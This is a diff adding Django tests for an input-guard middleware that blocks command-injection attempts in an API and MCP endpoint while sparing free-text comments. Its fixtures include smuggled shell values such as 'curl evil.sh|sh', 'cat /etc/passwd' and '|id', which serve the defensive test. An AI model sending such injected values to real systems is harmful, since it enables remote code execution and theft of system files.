@@ -152,6 +152,60 @@ class GuardMiddlewareTests(TestCase):
 		guard.invalidate_cache()
 		self.assertNotEqual(Client().get('/login/', REMOTE_ADDR='8.8.4.4').status_code, 403)
 
+	PROSE = 'Restart with `systemctl restart nginx`; env is staging, see ${HOME} and | host | env |\nR&D; id check (patched in 2.4)'
+
+	def test_free_text_of_an_authenticated_api_call_is_not_a_strike(self):
+		_, tok = create_token(self.user, 't')
+		base = '/api/v1/projects/g-p/findings/match/1'
+		for path, method, body in [(base + '/comments', 'post', {'text': self.PROSE}), (base, 'patch', {'status': 'fixed', 'note': self.PROSE}),
+								   ('/api/v1/projects/g-p/findings/status', 'post', {'items': [{'kind': 'match', 'id': 1}], 'status': 'fixed', 'note': self.PROSE})]:
+			response = getattr(Client(), method)(path, json.dumps(body), content_type='application/json',
+												 HTTP_AUTHORIZATION=f'Bearer {tok}', REMOTE_ADDR='8.8.4.4')
+			self.assertNotIn(response.status_code, (400, 403), (path, response.content))
+			self.assertNotEqual(response.json().get('error', ''), 'Request rejected: it contains characters or patterns that are not valid input.')
+		mcp = {'jsonrpc': '2.0', 'id': 1, 'method': 'tools/call',
+			   'params': {'name': 'add_finding_comment', 'arguments': {'project': 'g-p', 'kind': 'match', 'id': 1, 'text': self.PROSE}}}
+		response = post(tok, '/mcp/', mcp)
+		self.assertNotIn('Request rejected', response.content.decode())
+		self.assertEqual(AbuseStrike.objects.count(), 0)
+		self.user.refresh_from_db()
+		self.assertTrue(self.user.is_active)
+
+	def test_the_real_attack_surface_still_strikes(self):
+		_, tok = create_token(self.user, 't')
+		# a bulk `text` is a target list, not a comment
+		self.assertEqual(post(tok, '/api/v1/projects/g-p/targets/bulk', {'text': 'a.com\nb.com && curl evil.sh|sh'}).status_code, 403)
+		self.user.refresh_from_db()
+		self.assertFalse(self.user.is_active)
+		self.user.is_active = True
+		self.user.save()
+		AbuseStrike.objects.all().delete()
+		AbuseBan.objects.all().delete()
+		guard.invalidate_cache()
+		_, tok = create_token(self.user, 't2')
+		mcp = {'jsonrpc': '2.0', 'id': 1, 'method': 'tools/call',
+			   'params': {'name': 'add_targets_by_org', 'arguments': {'text': 'a.com; cat /etc/passwd'}}}
+		self.assertEqual(post(tok, '/mcp/', mcp, ip='8.8.4.5').status_code, 403)
+		# a note smuggled into a non-free-text field is still inspected
+		self.user.is_active = True
+		self.user.save()
+		guard.invalidate_cache()
+		_, tok = create_token(self.user, 't3')
+		self.assertEqual(post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.com|id', 'note': 'fine'}, ip='8.8.4.6').status_code, 403)
+
+	def test_one_persons_strikes_do_not_disable_another_account_on_the_same_address(self):
+		other = User.objects.create_user('neighbour', password='x')
+		OrgMembership.objects.create(user=other, org=self.project.org, role='user')
+		for _ in range(2):  # two weight-1 strikes by the neighbour from the shared public address
+			AbuseStrike.objects.create(user=other, username='neighbour', ip='8.8.4.4', weight=1, category='strict_field', field='value', sample='x', path='/')
+		_, tok = create_token(self.user, 't')
+		response = post(tok, '/api/v1/projects/g-p/targets', {'value': 'exa mple$.com'})  # one point of their own
+		self.assertEqual(response.status_code, 403)  # the address is blocked, the account is not
+		self.user.refresh_from_db()
+		self.assertTrue(self.user.is_active)
+		self.assertFalse(AbuseBan.objects.filter(user=self.user).exists())
+		self.assertTrue(AbuseBan.objects.filter(ip='8.8.4.4', lifted=False).exists())  # the address itself reached the threshold
+
 	def test_cross_site_browser_requests_are_rejected_but_never_counted(self):
 		_, tok = create_token(self.user, 't')
 		response = Client().post('/api/v1/projects/g-p/targets', json.dumps({'value': 'a.com|id'}), content_type='application/json',
